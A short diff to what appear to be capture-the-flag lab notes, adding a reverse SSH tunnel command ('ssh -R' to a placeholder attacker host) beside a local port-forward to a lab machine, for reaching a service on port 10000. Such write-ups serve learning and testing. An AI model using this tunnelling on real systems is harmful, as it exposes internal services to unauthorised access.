@@ -94,6 +94,7 @@ tcp    LISTEN     0      128                          :::22                     
 tcp    LISTEN     0      128                          :::80                                       :::*
 
 SSH Tunnel
+ssh -R 10000:127.0.0.1:10000 <attacker user>@<attcker ip>
 
 ssh -L 10000:localhost:10000 agent47@10.10.79.57
 
